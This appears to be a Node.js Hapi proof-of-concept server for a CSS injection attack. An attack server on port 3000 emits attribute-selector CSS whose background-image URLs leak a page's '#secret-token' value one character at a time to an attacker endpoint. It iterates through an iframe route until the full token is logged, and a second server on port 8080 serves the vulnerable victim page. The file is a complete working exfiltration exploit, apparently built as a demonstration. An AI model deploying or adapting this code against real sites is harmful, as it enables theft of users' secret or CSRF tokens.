'use strict';

const Path = require('path');
const Hapi = require('hapi');

const server = new Hapi.Server({
    connections: {
        routes: {
            files: {
                relativeTo: Path.join(__dirname)
            }
        }
    }
});
const attackConnection = server.connection({
    port: 3000,
    host: '0.0.0.0',
    routes: {
        cors: true,
        state: {
            parse: true,
            failAction: 'ignore',
        }
    },
});

const victimServer = server.connection({
    port: 8080,
    host: '0.0.0.0',
    routes: {
        cors: true,
        state: {
            parse: true,
            failAction: 'ignore',
        }
    },
});

const cookieConfig = {
    ttl: null,
    isSecure: false,
    isHttpOnly: false,
    encoding: 'base64json',
    isSameSite: false,
    clearInvalid: true, // remove invalid cookies
    strictHeader: false // don't allow violations of RFC 6265
}

attackConnection.state('foundToken', cookieConfig);

const MAX_TOKEN_LENGTH = 10;
let foundToken = '';

function createAttributeSelectorFor(char) {
    return `
#secret-token[value^=${foundToken}${char}] {
    background-image: url(http://localhost:3000/token/${foundToken}${char});
}
    `.trim();
}

function createAttributeSelectors() {
    const chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
    let result = '';
    for (const char of chars) {
        result += createAttributeSelectorFor(char) + '\n';
    }
    return result;
}

attackConnection.route({
    method: 'GET',
    path: '/first-pass.css',
    handler: function (request, reply) {
        reply(createAttributeSelectors().trim()).type('text/css')
    }
});

attackConnection.route({
    method: 'GET',
    path: '/token/{token}',
    handler: function (request, reply) {
        foundToken = request.params.token;
        if (foundToken.length === MAX_TOKEN_LENGTH) {
            console.log('FOUND: ', foundToken);
        }
        reply(``);
    }
});

attackConnection.route({
    method: 'GET',
    path: '/iframe',
    handler(request, reply) {
        if (foundToken.length === MAX_TOKEN_LENGTH) {
            reply(`<h1>${foundToken}</h1>`).state('foundToken', '');
            foundToken = '';
        } else {
            reply.view('iframe', { foundToken }).state('foundToken', foundToken);
        }
    }
});

victimServer.route({
    method: 'GET',
    path: '/',
    handler(request, reply) {
        reply.file('vulnerablesite.html');
    }
});

server.register([require('inert'), require('vision')], (err) => {
    if (err) {
        throw err;
    }

    server.views({
        engines: {
            html: require('handlebars')
        },
        relativeTo: __dirname
    });

    server.start((err) => {
        if (err) {
            throw err;
        }

        server.connections.forEach(connection => {
            console.log('Server started at: ' + connection.info.uri);
        });
    });
});

